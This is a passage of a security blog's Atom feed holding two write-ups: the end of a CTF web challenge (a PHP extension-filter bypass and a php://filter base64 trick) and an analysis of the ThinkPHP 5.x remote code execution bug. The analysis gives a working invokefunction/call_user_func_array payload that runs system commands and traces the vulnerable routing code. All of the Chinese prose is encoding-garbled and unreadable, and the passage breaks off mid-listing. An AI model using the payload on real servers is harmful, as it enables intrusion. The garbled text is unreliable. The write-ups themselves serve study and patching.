alt="kO4ySf.png"></p><p>ä¸‹é¢çš„ä»£ç å°±æ˜¯å¯¹å†™å…¥æ–‡ä»¶çš„åç¼€åè¿‡æ»¤ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡æ»¤å¤ªå®¹æ˜“ï¼Œå› ä¸ºåé¢æ˜¯æœ‰å…³å†™æ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œä»–åœ¨åº•å±‚ä¼šåšä¸€äº›æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ç‚¹åœ¨æˆ‘upload-labè¿™ç¯‡æ–‡ç« é‡Œé¢æœ‰æåŠè¿‡ï¼Œè¿™é‡Œåªéœ€è¦ç”¨ç±»ä¼¼<code>index.php/.</code>è¿™æ ·çš„æ–‡ä»¶ååšç»•è¿‡</p><p>åœ¨è§‚å¯Ÿä¸€ä¸‹ä»£ç ä¸­å¯ä»¥å†™å…¥çš„å†…å®¹ï¼Œå¯ä»¥å‘ç°å†™è¿›å»çš„å†…å®¹éƒ½ä¼šç»è¿‡<code>htmlspecialchars</code>è¿™ä¸ªå‡½æ•°ï¼Œé‚£å°±æ˜¯è¯´ä¸€æ—¦é‡åˆ°ç±»ä¼¼<code>&lt;</code>æˆ–è€…<code>&gt;</code>è¿™çš„æ“ä½œç¬¦ï¼Œå°±ä¼šè½¬ä¹‰ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kXSFud.png" alt="kXSFud.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOzz4K.png" alt="kOzz4K.png"></p><p>è¿™é‡Œåˆæ¶‰åŠåˆ°å¦å¤–çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹äº†ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ä¸€ç¯‡æ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.htmlï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®ç¬¬ä¸€æ¬¡æˆ‘å¥½åƒå®åœ¨moctfä¸Šçš„ä¸€ä¸ªé¢˜ç›®è§åˆ°çš„233333" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.htmlï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®ç¬¬ä¸€æ¬¡æˆ‘å¥½åƒå®åœ¨moctfä¸Šçš„ä¸€ä¸ªé¢˜ç›®è§åˆ°çš„233333</a></p><p>ç”±äºæ˜¯å†™å…¥æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨phpä¼ªåè®®å»å®ç°å¤šç§éªšæ“ä½œï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°base64è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºbase64ç¼–ç åœ¨é‡åˆ°ä¸åœ¨å…¶ç¼–ç é›†çš„å­—ç¬¦çš„è¯ä¼šç›´æ¥è·³è¿‡ï¼Œå¹¶ä¸”è§£ç çš„æ—¶å€™æ˜¯4ä½4ä½ä¸€ç»„ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸‹é¢çš„payloadè¦å‡‘å‡ºå››ä¸ªå››ä¸ªä¸€ç»„ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„é—®é¢˜ï¼Œç”±äº<code>dig</code>æ¥å—çš„å‚æ•°ä¸å…è®¸è¿‡é•¿ï¼Œå¦åˆ™ç›´æ¥è¿”å›ç©ºï¼Œæ‰€ä»¥payloadéœ€è¦å°½å¯èƒ½çš„çŸ­ä¸€äº›ï¼Œæ„é€ payloadï¼š</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnCn0.png" alt="kXnCn0.png"></p><p>æ³¨æ„è¿™é‡Œä½¿ç”¨å››ä¸ª<code>*</code>å°±æ˜¯ä¸ºäº†ä¸è®©å‘é€çš„å†…å®¹å‡ºç°<code>=</code>ï¼Œå› ä¸ºå¦‚æœå‡ºç°çš„è¯å°±ä¼šå¯¼è‡´postå‚æ•°å¢åŠ ä¸€ä¸ªï¼ŒåŒæ—¶ä¹Ÿèµ·åˆ°äº†æ³¨é‡Šçš„ä½œç”¨ï¼Œè¿™é‡Œè§†æƒ…å†µå°†<code>*</code>å¢åŠ ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnQHK.png" alt="kXnQHK.png"></p><p>å‘åŒ…æµ‹è¯•ç»“æœæˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnJ9H.png" alt="kXnJ9H.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kXn78J.png" alt="kXn78J.png"></p><p>è¿˜æœ‰ä¸€é“PHPé¢˜ç›®æ”¾åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« è¯´è¯´å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™æ³¢åˆ·é¢˜ä¸»è¦ä»¥å­¦ä¹ ä¸ºä¸»ï¼Œå¤ç°ä¸ºä¸»ï¼ŒçŸ¥è¯†ç‚¹çœŸçš„å¤ªæ£’äº†
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.x RCEåˆ†æ</title>
    <link href="0verwatch.top/thinkphp-5-rce.html"/>
    <id>0verwatch.top/thinkphp-5-rce.html</id>
    <published>2019-02-15T06:58:27.000Z</published>
    <updated>2019-02-15T06:59:56.368Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡è¿›è¡Œä»£ç é‡è¿™ä¹ˆå¤§çš„åˆ†æï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¸ªäººæ„Ÿè§‰æ–°æ‰‹çœŸçš„ä¸é€‚åº”è¿™ç§ï¼Œåº”è¯¥æ‰¾ç‚¹å°ä¸€ç‚¹çš„cmså»åˆ†æï¼Œå¦‚æœä¸æ‡‚MVCæ¶æ„<a id="more"></a>çœŸçš„å¯èƒ½ä¼šæ‡µã€‚ã€‚ã€‚</p><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨åˆ†æè¿™ä¸ªä¹‹å‰è¿˜çœ‹äº†ä¸¤ç¯‡tp5çš„RCEæ¼æ´ï¼Œè¿™ä¸¤ä¸ªæ´éƒ½æ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨ä¸€ä¸ªå¯æ§çš„å˜é‡dispatchå»å®ç°åˆ°æœ€åè¿˜æ˜¯æ„é€ å‡ºå›è°ƒå‡½æ•°ï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™é‡Œé¢çš„æ€è·¯å°±æ˜¯æœ¬æ–‡åˆ†ææ¼æ´çš„æ¥æº</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>æˆ‘è¿™é‡Œå·²tp 5.0.22ä¸ºä¾‹å­ï¼Œç¯å¢ƒæ˜¯phpstudyæ­å»ºçš„</p><h3 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h3><p>å½±å“ç‰ˆæœ¬<br>THINKPHP 5.0.5-5.0.22</p><p>THINKPHP 5.1.0-5.1.30</p><p>5.0.xè¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p><img src="https://s2.ax1x.com/2019/02/15/kDf8x0.png" alt="kDf8x0.png"></p><p>5.1.xè¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¡¥ä¸ä¸­åŠ äº†æ­£åˆ™é™åˆ¶äº†æ§åˆ¶å™¨çš„è‡ªå®šä¹‰åˆå§‹åŒ–</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp52/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¡¥ä¸ä¸‹çš„ç‚¹ï¼ŒåŠ¨æ€è·Ÿè¸ªä¸€ä¸‹æ˜¯å¦æ˜¯å› ä¸ºcontrolleræ²¡æœ‰åšå¥½è¿‡æ»¤è€Œå®ä½“åŒ–ï¼Œç¡®å®æ˜¯å¦‚æ­¤</p><p><img src="https://s2.ax1x.com/2019/02/15/kD51Gd.png" alt="kD51Gd.png"></p><p>æ ¹æ®ä¼ è¿›å»çš„payloadï¼Œæ§åˆ¶å™¨ä»¥åŠä¸‹é¢çš„æ–¹æ³•éƒ½ä¼šå‘ç”Ÿå¯¹åº”çš„å˜åŒ–ï¼Œä¸‹é¢å°±å¯ä»¥åˆ†æä¸€ä¸‹æ”»å‡»é“¾çš„æµç¨‹</p><p>å¯ä»¥ä»å…¥å£æ–‡ä»¶ä¸€çº§ä¸€çº§è·Ÿè¸ªï¼Œè¿›å…¥åˆ°<code>App.php</code>ä¸­ï¼Œè¿™é‡Œåº”è¯¥æ¶‰åŠåˆ°ä¸€ä¸ªå¼€å‘çš„çŸ¥è¯†ï¼Œåœ¨<code>App.php</code>ä¸­ï¼Œä¼šæ ¹æ®è¯·æ±‚çš„URLè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æåœ¨<code>App.php</code>ä¸­ï¼Œä¼šæ ¹æ®è¯·æ±‚çš„URLè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æè·å¾—åˆ°<code>$dispatch</code>ï¼Œæ‰€ä»¥payloadæ˜¯ä¸€å®šè¦ç»è¿‡é‚£é‡Œçš„ï¼Œå¯ä»¥åœ¨é‚£é‡ŒåŠ æ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p>å®šä½åˆ°<code>/thinkphp/library/think/App.php:116</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æœªè®¾ç½®è°ƒåº¦ä¿¡æ¯åˆ™è¿›è¡Œ URL è·¯ç”±æ£€æµ‹</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">                $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯</span></span><br><span class="line">            $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    $data = <span class="keyword">self</span>::exec($dispatch, $config);<span class="comment">//è¿™ä¸ªå‡½æ•°å¾ˆå…³é”®</span></span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>routeCheck</code>è¿™ä¸ªå‡½æ•°ï¼ŒåŒæ ·åœ¨App.phpé‡Œé¢</p><p><img src="https://s2.ax1x.com/2019/02/15/kDo5K1.png" alt="kDo5K1.png"></p><p>ç»§ç»­è·Ÿè¿›åˆ°<code>path</code>æ–¹æ³•é‡Œé¢ï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªpathinfo()å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        $suffix   = Config::get(<span class="string">'url_html_suffix'</span>);</span><br><span class="line">        $pathinfo = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $suffix) &#123;</span><br><span class="line">            <span class="comment">// ç¦æ­¢ä¼ªé™æ€è®¿é—®</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = $pathinfo;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($suffix) &#123;</span><br><span class="line">            <span class="comment">// å»é™¤æ­£å¸¸çš„URLåç¼€</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.('</span> . ltrim($suffix, <span class="string">'.'</span>) . <span class="string">')$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å…è®¸ä»»ä½•åç¼€è®¿é—®</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.'</span> . <span class="keyword">$this</span>-&gt;ext() . <span class="string">'$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Config::get(&#39;var_pathinfo&#39;)</code>æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®çš„å‚æ•°ï¼Œé»˜è®¤å€¼ä¸º<code>s</code>ï¼Œæ€ä¹ˆæ‰¾åˆ°è¿™ä¸ªå˜é‡ï¼Ÿå¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹ï¼Œå¯ä»¥æœç´¢åˆ°å…¶ä¸­ä¸€ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢æœ‰</p><p><img src="https://s2.ax1x.com/2019/02/15/kDThFS.png" alt="kDThFS.png"></p><p>ä»GETä¸­è·å–é”®å€¼ï¼Œç„¶åèµ‹å€¼ç»™<code>routeCheck</code>ä¸­çš„<code>$path</code>ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯<code>index/think\app/invokefunction</code>ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDTvYF.png" alt="kDTvYF.png"></p><p>ç„¶åå¼€å§‹è¿›å…¥è·¯ç”±æ£€æµ‹çš„éƒ¨åˆ†ï¼Œç»è¿‡checkçš„æ£€æŸ¥åä¼šè¿›å…¥elseçš„åˆ†æ”¯ï¼Œä½†è¿™ä¸€éƒ¨åˆ†å¯¹äºæˆ‘ä»¬éœ€è¦æ§åˆ¶çš„å˜é‡æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå…³é”®æ˜¯<code>$result</code>ä»¥åŠ<code>$must</code>è¿™ä¸¤ä¸ªå˜é‡çš„èµ‹å€¼ç»“æœï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´äº†åé¢æ“ä½œçš„å…³é”®ï¼Œå¯ä»¥è¿›å…¥<code>Route::parseUrl</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">'pathinfo_depr'</span>];</span><br><span class="line">        $result = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·¯ç”±æ£€æµ‹</span></span><br><span class="line">        $check = !is_null(<span class="keyword">self</span>::$routeCheck) ? <span class="keyword">self</span>::$routeCheck : $config[<span class="string">'url_route_on'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">            <span class="comment">// å¼€å¯è·¯ç”±</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">                <span class="comment">// è¯»å–è·¯ç”±ç¼“å­˜</span></span><br><span class="line">                $rules = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">'route.php'</span>;</span><br><span class="line">                is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">                <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                        <span class="comment">// å¯¼å…¥è·¯ç”±é…ç½®</span></span><br><span class="line">                        $rules = <span class="keyword">include</span> CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                        is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·¯ç”±æ£€æµ‹ï¼ˆæ ¹æ®è·¯ç”±å®šä¹‰è¿”å›ä¸åŒçš„URLè°ƒåº¦ï¼‰</span></span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">            $must   = !is_null(<span class="keyword">self</span>::$routeMust) ? <span class="keyword">self</span>::$routeMust : $config[<span class="string">'url_route_must'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($must &amp;&amp; <span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                <span class="comment">// è·¯ç”±æ— æ•ˆ</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·¯ç”±æ— æ•ˆ è§£ææ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°... æ”¯æŒæ§åˆ¶å™¨è‡ªåŠ¨æœç´¢</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[<span class="string">'controller_auto_search'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>Route::parseUrl</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">            <span class="comment">// å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line">        $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">        ....</span><br><span class="line">         <span class="keyword">return</span> [<span class="string">'type'</span> =&gt; <span class="string">'module'</span>, <span class="string">'module'</span> =&gt; $route];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›ä¸€ä¸‹<code>parseUrlPath()</code>ï¼Œè¿™é‡Œé¢å°±æ˜¯è¿”å›ä¸€ä¸ª$pathå˜é‡ï¼Œå¯¹åŒ…å«<code>æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</code>çš„URLè¿›è¡Œåˆ†å‰²æˆæ•°ç»„è¿›è¡Œè¿”å›</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHQgJ.png" alt="kDHQgJ.png"></p><p>å›åˆ°ä¸Šä¸€å±‚çš„å‡½æ•°ä¸­ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°åœ¨è‡ªåŠ¨æœç´¢æ§åˆ¶å™¨çš„åˆ¤æ–­ä¸­è¿›å…¥äº†elseè¯­å¥ï¼Œä»è€Œä¸ºæ§åˆ¶å™¨è¿›è¡Œäº†èµ‹å€¼ï¼Œè¿™é‡Œæ˜¯ä¸ªèµ‹å€¼ç‚¹ï¼Œå¾ˆå…³é”®</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHtUK.png" alt="kDHtUK.png"></p><p>ç„¶åä»¥$routeå˜é‡è¿”å›ä¸Šå±‚runå‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHrDI.png" alt="kDHrDI.png"></p><p>æ­¤æ—¶$dispatch è¿›å…¥åˆ°self::exec()ä¸­ï¼Œç»§ç»­è·Ÿè¿›ã€‚æ­¤æ—¶çš„$dispatch é‡Œé¢æ˜¯ä¸€ä¸ªä»¥moduleä¸ºåå­—çš„æ•°ç»„ï¼Œæ‰€ä»¥è¿›å…¥execå‡½æ•°ä¸­å¿…å°†è¿›å…¥åˆ†æ”¯ä¸ºmoduleçš„æ¨¡å—ï¼Œç„¶åè¿›å…¥<code>self::module</code>å‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbesA.png" alt="kDbesA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($dispatch, $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($dispatch[<span class="string">'type'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'redirect'</span>: <span class="comment">// é‡å®šå‘è·³è½¬</span></span><br><span class="line">                $data = Response::create($dispatch[<span class="string">'url'</span>], <span class="string">'redirect'</span>)</span><br><span class="line">                    -&gt;code($dispatch[<span class="string">'status'</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'module'</span>: <span class="comment">// æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</span></span><br><span class="line">                $data = <span class="keyword">self</span>::module(</span><br><span class="line">                    $dispatch[<span class="string">'module'</span>],</span><br><span class="line">                    $config,</span><br><span class="line">                    <span class="keyword">isset</span>($dispatch[<span class="string">'convert'</span>]) ? $dispatch[<span class="string">'convert'</span>] : <span class="keyword">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ...............</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>self::module</code>å‡½æ•°ï¼Œåœ¨è¿›å…¥å¤šæ¨¡å—éƒ¨ç½²åç”±äºï¼Œbindçš„å€¼ä¸ºnullï¼Œä¼šè¿›å…¥elseifçš„æ¡ä»¶ï¼Œä½¿availableçš„å˜é‡æˆä¸ºtrueï¼Œè¿™ä¹Ÿæ˜¯åé¢ä¸ºä»€ä¹ˆå¯ä»¥é¡ºåˆ©åˆå§‹åŒ–moduleçš„æ¡ä»¶ï¼Œä¸ç„¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸XDã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbqeI.png" alt="kDbqeI.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 